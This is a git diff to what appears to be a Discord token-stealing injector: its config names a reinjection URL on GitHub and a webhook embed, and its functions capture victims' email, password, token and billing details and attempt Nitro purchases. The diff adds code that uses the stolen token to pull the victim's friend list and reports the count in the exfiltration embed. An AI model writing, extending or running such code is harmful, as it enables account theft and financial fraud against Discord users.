@@ -14,7 +14,7 @@ const config = {
   ping_val: '@everyone', 
   embed_name: 'BulkFA', 
   embed_icon: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
-  embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
+  embed_color: 000000, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   injection_url: 'https://raw.githubusercontent.com/otar120/injector/main/index.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
@@ -512,6 +512,27 @@ const getBilling = async (token) => {
   return billing;
 };
 
+const fetchFriends = async (token) => {
+  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
+    xmlHttp.open("GET", "https://discord.com/api/v6/users/@me/relationships", false); 
+    xmlHttp.setRequestHeader("Authorization", "${token}"); 
+    xmlHttp.send(null); 
+    xmlHttp.responseText`);
+  if (!bill.lenght || bill.length === 0) return '';
+  return JSON.parse(bill);
+};
+
+const getFriends = async (token) => {
+  let s = 0;
+  const data = await fetchFriends(token);
+  data.forEach((x) => {
+    if (x['type'] ==1) {
+      s+=1;
+    }
+  });
+  return s;
+};
+
 const Purchase = async (token, id, _type, _time) => {
   const options = {
     expected_amount: config.nitro[_type][_time]['price'],
@@ -653,6 +674,7 @@ const login = async (email, password, token) => {
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
+  const friends = await getFriends(token);
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
@@ -673,6 +695,11 @@ const login = async (email, password, token) => {
           {
             name: '<:944007233820307467:959785232037470208> Billing:',
             value: `**${billing}**`,
+            inline: true,
+          },
+          {
+            name: '<:944081229207175199:959785231999721472> Friends:',
+            value: `\`${friends}\``,
             inline: true,
           },
           {
